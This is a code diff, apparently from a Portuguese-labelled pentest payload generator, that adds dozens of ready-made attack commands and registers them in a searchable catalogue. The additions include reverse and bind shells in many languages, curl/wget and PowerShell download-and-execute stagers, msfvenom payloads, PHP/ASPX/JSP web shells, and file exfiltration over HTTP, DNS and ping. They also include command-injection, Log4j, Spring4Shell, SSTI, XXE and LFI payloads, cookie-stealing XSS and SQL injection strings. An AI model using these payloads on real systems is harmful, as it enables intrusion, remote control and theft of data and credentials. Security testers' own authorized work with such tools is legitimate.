@@ -33,6 +33,145 @@ function revPowershell(ip, port) {
   return "$c=New-Object Net.Sockets.TCPClient('" + ip + "'," + port + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}";
 }
 
+function revPerl(ip, port) {
+  return "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
+}
+
+function revNode(ip, port) {
+  return "node -e '(function(){var s=require(\"net\").Socket();s.connect(" + port + ",\"" + ip + "\",function(){var sh=require(\"child_process\").spawn(\"/bin/sh\",[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);});})()'";
+}
+
+function revSocat(ip, port) {
+  return "socat TCP:" + ip + ":" + port + " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane";
+}
+
+function revSocatSSL(ip, port) {
+  return "socat OPENSSL:" + ip + ":" + port + ",verify=0 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane";
+}
+
+function revOpenssl(ip, port) {
+  return "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect " + ip + ":" + port + " > /tmp/s; rm /tmp/s";
+}
+
+function revAwk(ip, port) {
+  return "awk 'BEGIN {s = \"/inet/tcp/0/" + ip + "/" + port + "\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while( (c |& getline) > 0 ) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null";
+}
+
+function revTelnet(ip, port) {
+  return "TF=$(mktemp -u);mkfifo $TF && telnet " + ip + " " + port + " 0<$TF | sh 1>$TF";
+}
+
+function revBusybox(ip, port) {
+  return "busybox nc " + ip + " " + port + " -e /bin/sh";
+}
+
+function revNcatSSL(ip, port) {
+  return "ncat --ssl " + ip + " " + port + " -e /bin/sh";
+}
+
+function revBashB64(ip, port) {
+  var raw = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
+  var b64 = "";
+  try { b64 = Qt.btoa(raw); } catch (e) { b64 = ""; }
+  return "echo " + b64 + " | base64 -d | bash";
+}
+
+function revCurlPipe(ip, port) {
+  return "curl http://" + ip + ":8000/s.sh | bash";
+}
+
+function revWgetPipe(ip, port) {
+  return "wget -qO- http://" + ip + ":8000/s.sh | bash";
+}
+
+function revPowershellIex(ip, port) {
+  return "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://" + ip + ":8000/s.ps1')\"";
+}
+
+function revPowershellEncodedHint() {
+  return "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64_UTF16LE>";
+}
+
+function revBindNc(port) {
+  return "nc -lvnp " + port + " -e /bin/sh";
+}
+
+function revBindSocat(port) {
+  return "socat TCP-LISTEN:" + port + ",reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane";
+}
+
+function revBindPython(port) {
+  return "python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\"," + port + "));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'";
+}
+
+function listenerNc(port) {
+  return "nc -lvnp " + port;
+}
+
+function listenerNcat(port) {
+  return "ncat -lvnp " + port;
+}
+
+function listenerNcatSSL(port) {
+  return "ncat --ssl -lvnp " + port;
+}
+
+function listenerSocat(port) {
+  return "socat TCP-LISTEN:" + port + ",reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane";
+}
+
+function listenerSocatTTY(port) {
+  return "socat file:`tty`,raw,echo=0 TCP-LISTEN:" + port + ",reuseaddr";
+}
+
+function listenerMsf(ip, port) {
+  return "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST " + ip + "; set LPORT " + port + "; exploit\"";
+}
+
+function msfvenomElf(ip, port) {
+  return "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f elf -o rev.elf";
+}
+
+function msfvenomPhp(ip, port) {
+  return "msfvenom -p php/meterpreter_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f raw -o shell.php";
+}
+
+function msfvenomAspx(ip, port) {
+  return "msfvenom -p windows/meterpreter_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f aspx -o shell.aspx";
+}
+
+function msfvenomPs1(ip, port) {
+  return "msfvenom -p windows/x64/shell_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f powershell -o rev.ps1";
+}
+
+function msfvenomWar(ip, port) {
+  return "msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f war -o shell.war";
+}
+
+function webshellPhpMin() {
+  return "<?php system($_GET['cmd']); ?>";
+}
+
+function webshellPhpPost() {
+  return "<?php if(isset($_POST['c'])){echo '<pre>';system($_POST['c']);echo '</pre>';} ?>";
+}
+
+function webshellPhpShort() {
+  return "<?=shell_exec($_GET[0])?>";
+}
+
+function webshellAspxMin() {
+  return "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]); %>";
+}
+
+function webshellJspMin() {
+  return "<% if(request.getParameter(\"cmd\")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\")); java.io.InputStream i=p.getInputStream(); int a; while((a=i.read())!=-1){out.print((char)a);} } %>";
+}
+
+function webshellUpgradeHint(ip, port) {
+  return "curl 'http://TARGET/shell.php?cmd='$(python3 -c \"import urllib.parse;print(urllib.parse.quote('bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'))\")";
+}
+
 function ttyPython() {
   return "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'";
 }
@@ -95,6 +234,196 @@ function transferNcListen(port) {
   return "nc -l -p " + port + " > data";
 }
 
+function exfilCurlFile(ip, port, file) {
+  return "curl -X POST --data-binary @" + file + " http://" + ip + ":" + port + "/exfil";
+}
+
+function exfilWgetPost(ip, port, file) {
+  return "wget --post-file=" + file + " http://" + ip + ":" + port + "/exfil -O /dev/null";
+}
+
+function exfilNcFile(ip, port, file) {
+  return "nc " + ip + " " + port + " < " + file;
+}
+
+function exfilTarNc(ip, port) {
+  return "tar czf - /var/www/html 2>/dev/null | nc " + ip + " " + port;
+}
+
+function exfilB64Chunk(ip, port, file) {
+  return "base64 -w0 " + file + " | fold -w 1000 | while read c; do curl -s -X POST -d \"d=$c\" http://" + ip + ":" + port + "/exfil >/dev/null; done";
+}
+
+function exfilPythonHttp(ip, port, file) {
+  return "python3 -c 'import requests;open(\"/tmp/o\",\"wb\").write(requests.get(\"http://" + ip + ":" + port + "/" + file + "\").content)'  # download | upload: python3 -c 'import requests;requests.post(\"http://" + ip + ":" + port + "/exfil\",data=open(\"" + file + "\",\"rb\").read())'";
+}
+
+function exfilDns(file) {
+  return "for f in $(base64 -w63 " + file + " | tr -d '='); do dig $f.exfil.attacker.com +short; done";
+}
+
+function exfilNslookup(file) {
+  return "for /f %i in ('certutil -encode " + file + " tmp.b64 ^&^& type tmp.b64') do nslookup %i.exfil.attacker.com";
+}
+
+function exfilPing(file) {
+  return "xxd -p " + file + " | while read l; do ping -c1 -p $l " + "ATTACKER_IP" + "; done";
+}
+
+function exfilPowershellFile(ip, port, file) {
+  return "Invoke-WebRequest -Uri http://" + ip + ":" + port + "/exfil -Method POST -InFile " + file;
+}
+
+function exfilPowershellB64(ip, file) {
+  return "$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('" + file + "')); IWR http://" + ip + "/c?d=$d";
+}
+
+function exfilCertutilEncode(file) {
+  return "certutil -encode " + file + " tmp.b64 & type tmp.b64";
+}
+
+function exfilCurlMetadata() {
+  return "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/  # cloud SSRF";
+}
+
+function rceSemicolon(cmd) {
+  return "; " + cmd;
+}
+
+function rcePipe(cmd) {
+  return "| " + cmd;
+}
+
+function rceAnd(cmd) {
+  return "&& " + cmd;
+}
+
+function rceOr(cmd) {
+  return "|| " + cmd;
+}
+
+function rceSubshell(cmd) {
+  return "$(" + cmd + ")";
+}
+
+function rceBacktick(cmd) {
+  return "`" + cmd + "`";
+}
+
+function rceNewline(cmd) {
+  return "%0a" + cmd;
+}
+
+function rceSpaceBypass(cmd) {
+  return cmd.split(" ").join("${IFS}");
+}
+
+function rceB64Wrapper(cmd) {
+  var b64 = "";
+  try { b64 = Qt.btoa(cmd); } catch (e) { b64 = "<B64>"; }
+  return "echo " + b64 + "|base64 -d|bash";
+}
+
+function rceHexWrapper(cmd) {
+  return "echo '" + cmd + "' | od -A n -t x1 | tr -d ' \\n'  # hex p/ printf: printf '\\x41\\x42'";
+}
+
+function rcePhpSystem() {
+  return "; system($_GET['cmd']); //";
+}
+
+function rcePhpPassthru() {
+  return "'; passthru($_GET['cmd']); //";
+}
+
+function rcePhpBacktick() {
+  return "'; echo `$_GET['cmd']`; //";
+}
+
+function rceWinAmp(cmd) {
+  return "& " + cmd;
+}
+
+function rceWinPowershellEncHint() {
+  return "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <BASE64_UTF16LE>";
+}
+
+function rceSstiDetect() {
+  return "{{7*7}}";
+}
+
+function rceSstiJinja() {
+  return "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}";
+}
+
+function rceSstiJinjaBypass() {
+  return "{{ cycler.__init__.__globals__.os.popen('id').read() }}";
+}
+
+function rceLog4j(ip, port) {
+  return "${jndi:ldap://" + ip + ":" + port + "/a}";
+}
+
+function rceLog4jBypass(ip, port) {
+  return "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + ip + ":" + port + "/a}";
+}
+
+function rceSpringParam() {
+  return "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()";
+}
+
+function uploadHtaccess() {
+  return "AddType application/x-httpd-php .jpg";
+}
+
+function uploadUserIni() {
+  return "auto_prepend_file=shell.jpg  # +.user.ini -> shell.jpg com <?php system($_GET['cmd']);?>";
+}
+
+function uploadDoubleExt() {
+  return "shell.phtml | shell.php5 | shell.pht | shell.phar | shell.jpg.php";
+}
+
+function lfiProcEnviron() {
+  return "foo.php?file=/proc/self/environ&cmd=id";
+}
+
+function lfiDataWrapper() {
+  return "foo.php?file=data://text/plain,<?php system($_GET['cmd']);?>&cmd=id";
+}
+
+function lfiExpectWrapper() {
+  return "foo.php?file=expect://id";
+}
+
+function lfiInputWrapper() {
+  return "curl -s -d '<?php system($_GET[\"cmd\"]);?>' 'http://TARGET/foo.php?file=php://input&cmd=id'";
+}
+
+function ssrfCloud() {
+  return "url=http://169.254.169.254/latest/meta-data/";
+}
+
+function ssrfBypass() {
+  return ["url=http://127.0.0.1:80/admin", "url=http://0.0.0.0/admin", "url=http://2130706433/admin", "url=http://0x7f.0x0.0x0.0x1/admin", "url=http://0177.0.0.1/admin"];
+}
+
+function xxeFile() {
+  return "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>";
+}
+
+function xxeOob(ip, port) {
+  return "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM \"http://" + ip + ":" + port + "/evil.dtd\"> %xxe;]><r/>";
+}
+
+function credCaptureXss(ip, port) {
+  return "<script>new Image().src='http://" + ip + ":" + port + "/?c='+encodeURIComponent(document.cookie)</script>";
+}
+
+function credLoggerServer(port) {
+  return "python3 -c 'from http.server import*;class H(BaseHTTPRequestHandler):\n def do_GET(self):print(self.path);self.send_response(200);self.end_headers();self.wfile.write(b\"ok\")\n def log_message(*a):pass\nHTTPServer((\"0.0.0.0\"," + port + "),H).serve_forever()'";
+}
+
 function lfiTraversal() {
   return "foo.php?file=../../../../../../etc/passwd";
 }
@@ -113,7 +442,57 @@ function sqliUnion() {
     "' UNION SELECT NULL,NULL,NULL FROM DUAL -- -",
     "' UNION ORDER BY 1 -- -",
     "' OR '1'='1' -- -",
-    "admin' --"
+    "admin' --",
+    "' OR '1'='1' /*",
+    "\" OR \"\"=\"",
+    "') OR ('1'='1' -- -",
+    "admin' OR '1'='1' -- -",
+    "' UNION SELECT 1,2,3 -- -",
+    "' UNION SELECT 1,@@version,3 -- -",
+    "' UNION SELECT 1,table_name,3 FROM information_schema.tables -- -",
+    "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' -- -",
+    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables -- -",
+    "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns -- -",
+    "' UNION SELECT 1,load_file('/etc/passwd'),3 -- -",
+    "' UNION SELECT 1,'pwned',3 INTO OUTFILE '/tmp/pwned.txt' -- -",
+    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- -",
+    "' AND UPDATEXML(1,CONCAT(0x3a,(SELECT @@version)),1) -- -",
+    "' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT user()))) -- -",
+    "' AND 1=1 -- -",
+    "' AND 1=2 -- -",
+    "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- -",
+    "' AND SLEEP(5) -- -",
+    "' AND BENCHMARK(10000000,MD5(1)) -- -",
+    "'; SELECT pg_sleep(5) -- -",
+    "'; WAITFOR DELAY '0:0:5' -- -",
+    "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -",
+    "' UNION SELECT NULL,NULL,sqlite_version() -- -",
+    "' UNION SELECT 1,2,3 FROM DUAL -- -",
+    "1' AND '1'='1",
+    "1 OR 1=1 -- -",
+    "'; EXEC xp_cmdshell 'whoami' -- -",
+    "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE -- -"
+  ];
+}
+
+
+function sqliNoSQL() {
+  return [
+    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+    "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+    "username[$ne]=x&password[$ne]=x",
+    "' || '1'=='1",
+    "{\"$where\": \"sleep(5000)\"}"
+  ];
+}
+
+function sqlmapHints() {
+  return [
+    "sqlmap -r req.txt --batch --level 2 --risk 1",
+    "sqlmap -u 'http://TARGET/page?id=1' --batch --dbs",
+    "sqlmap -u 'http://TARGET/page?id=1' --batch -D db -T users --dump",
+    "sqlmap -r req.txt --batch --os-shell",
+    "sqlmap -u 'http://TARGET/page?id=1' --batch --time-sec 5 --technique T"
   ];
 }
 
@@ -371,6 +750,468 @@ function getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost) {
       code: revRuby(ip, port),
       showUrl: true,
       keywords: "reverse shell ruby rev tcpsocket socket"
+    },
+    {
+      id: "rev-perl",
+      title: "Reverse Shell - Perl",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Perl.",
+      code: revPerl(ip, port),
+      showUrl: true,
+      keywords: "reverse shell perl rev socket"
+    },
+    {
+      id: "rev-node",
+      title: "Reverse Shell - Node.js",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Node.js.",
+      code: revNode(ip, port),
+      showUrl: true,
+      keywords: "reverse shell nodejs node rev socket child_process"
+    },
+    {
+      id: "rev-socat",
+      title: "Reverse Shell - Socat",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Socat.",
+      code: revSocat(ip, port),
+      showUrl: true,
+      keywords: "reverse shell socat rev pty tcp"
+    },
+    {
+      id: "rev-socat-ssl",
+      title: "Reverse Shell - Socat SSL",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Socat SSL.",
+      code: revSocatSSL(ip, port),
+      showUrl: true,
+      keywords: "reverse shell socat ssl openssl encrypted rev"
+    },
+    {
+      id: "rev-openssl",
+      title: "Reverse Shell - OpenSSL",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando OpenSSL.",
+      code: revOpenssl(ip, port),
+      showUrl: true,
+      keywords: "reverse shell openssl s_client encrypted tls rev"
+    },
+    {
+      id: "rev-awk",
+      title: "Reverse Shell - Awk",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Awk.",
+      code: revAwk(ip, port),
+      showUrl: true,
+      keywords: "reverse shell awk gawk rev inet tcp"
+    },
+    {
+      id: "rev-telnet",
+      title: "Reverse Shell - Telnet + fifo",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Telnet + fifo.",
+      code: revTelnet(ip, port),
+      showUrl: true,
+      keywords: "reverse shell telnet fifo mkfifo rev"
+    },
+    {
+      id: "rev-busybox",
+      title: "Reverse Shell - BusyBox nc",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando BusyBox nc.",
+      code: revBusybox(ip, port),
+      showUrl: true,
+      keywords: "reverse shell busybox netcat nc embedded rev"
+    },
+    {
+      id: "rev-ncat-ssl",
+      title: "Reverse Shell - Ncat SSL",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Ncat SSL.",
+      code: revNcatSSL(ip, port),
+      showUrl: true,
+      keywords: "reverse shell ncat ssl nmap encrypted rev"
+    },
+    {
+      id: "rev-bash-b64",
+      title: "Reverse Shell - Bash base64 wrapper",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bash base64 wrapper.",
+      code: revBashB64(ip, port),
+      showUrl: true,
+      keywords: "reverse shell bash base64 bypass filter waf rev encode"
+    },
+    {
+      id: "rev-curl-pipe",
+      title: "Reverse Shell - curl | bash stager",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando curl | bash stager.",
+      code: revCurlPipe(ip, port),
+      showUrl: true,
+      keywords: "reverse shell curl pipe bash stager download rev"
+    },
+    {
+      id: "rev-wget-pipe",
+      title: "Reverse Shell - wget | bash stager",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando wget | bash stager.",
+      code: revWgetPipe(ip, port),
+      showUrl: true,
+      keywords: "reverse shell wget pipe bash stager download rev"
+    },
+    {
+      id: "rev-ps-iex",
+      title: "Reverse Shell - PowerShell IEX remote",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando PowerShell IEX remote.",
+      code: revPowershellIex(ip, port),
+      showUrl: true,
+      keywords: "reverse shell powershell iex downloadstring remote windows rev"
+    },
+    {
+      id: "rev-ps-enc-hint",
+      title: "Reverse Shell - PowerShell -EncodedCommand (formato)",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando PowerShell -EncodedCommand (formato).",
+      code: revPowershellEncodedHint(),
+      showUrl: false,
+      keywords: "reverse shell powershell encodedcommand base64 utf16 bypass amsi windows"
+    },
+    {
+      id: "bind-nc",
+      title: "Bind Shell - Netcat",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bind Shell - Netcat.",
+      code: revBindNc(port),
+      showUrl: false,
+      keywords: "bind shell netcat nc listen connect rev"
+    },
+    {
+      id: "bind-socat",
+      title: "Bind Shell - Socat",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bind Shell - Socat.",
+      code: revBindSocat(port),
+      showUrl: false,
+      keywords: "bind shell socat listen pty rev"
+    },
+    {
+      id: "bind-python",
+      title: "Bind Shell - Python",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Bind Shell - Python.",
+      code: revBindPython(port),
+      showUrl: false,
+      keywords: "bind shell python listen socket rev"
+    },
+    {
+      id: "listener-nc",
+      title: "Listener - Netcat",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Netcat.",
+      code: listenerNc(port),
+      showUrl: false,
+      keywords: "listener netcat nc lvnp handler attacker rev"
+    },
+    {
+      id: "listener-ncat",
+      title: "Listener - Ncat",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Ncat.",
+      code: listenerNcat(port),
+      showUrl: false,
+      keywords: "listener ncat nmap handler rev"
+    },
+    {
+      id: "listener-ncat-ssl",
+      title: "Listener - Ncat SSL",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Ncat SSL.",
+      code: listenerNcatSSL(port),
+      showUrl: false,
+      keywords: "listener ncat ssl encrypted handler rev"
+    },
+    {
+      id: "listener-socat",
+      title: "Listener - Socat",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Socat.",
+      code: listenerSocat(port),
+      showUrl: false,
+      keywords: "listener socat handler pty rev"
+    },
+    {
+      id: "listener-socat-tty",
+      title: "Listener - Socat full TTY",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Socat full TTY.",
+      code: listenerSocatTTY(port),
+      showUrl: false,
+      keywords: "listener socat tty raw echo handler rev"
+    },
+    {
+      id: "listener-msf",
+      title: "Listener - Metasploit handler",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando Listener - Metasploit handler.",
+      code: listenerMsf(ip, port),
+      showUrl: false,
+      keywords: "listener metasploit msf handler meterpreter rev"
+    },
+    {
+      id: "msfvenom-elf",
+      title: "MSFVenom - Linux ELF reverse",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - Linux ELF reverse.",
+      code: msfvenomElf(ip, port),
+      showUrl: false,
+      keywords: "msfvenom elf linux reverse tcp payload generate"
+    },
+    {
+      id: "msfvenom-php",
+      title: "MSFVenom - PHP meterpreter",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - PHP meterpreter.",
+      code: msfvenomPhp(ip, port),
+      showUrl: false,
+      keywords: "msfvenom php meterpreter web payload"
+    },
+    {
+      id: "msfvenom-aspx",
+      title: "MSFVenom - ASPX meterpreter",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - ASPX meterpreter.",
+      code: msfvenomAspx(ip, port),
+      showUrl: false,
+      keywords: "msfvenom aspx windows iis meterpreter web"
+    },
+    {
+      id: "msfvenom-ps1",
+      title: "MSFVenom - PowerShell reverse",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
+      description: "Estabelece conex\u00e3o TCP reversa para o listener em {{LHOST}}:{{LPORT}} utilizando MSFVenom - PowerShell reverse.",
+      code: msfvenomPs1(ip, port),
+      showUrl: false,
+      keywords: "msfvenom powershell ps1 windows reverse"
+    },
+    {
+      id: "msfvenom-war",
+      title: "MSFVenom - WAR JSP reverse",
+      category: "rev",
+      categoryLabel: "Reverse",
+      icon: "\udb82\udfc4",
+      subcat: "shell",
+      context: "Conex\u00e3o Reversa TCP",
+      purpose: "Acesso interativo remoto para testes autorizados",
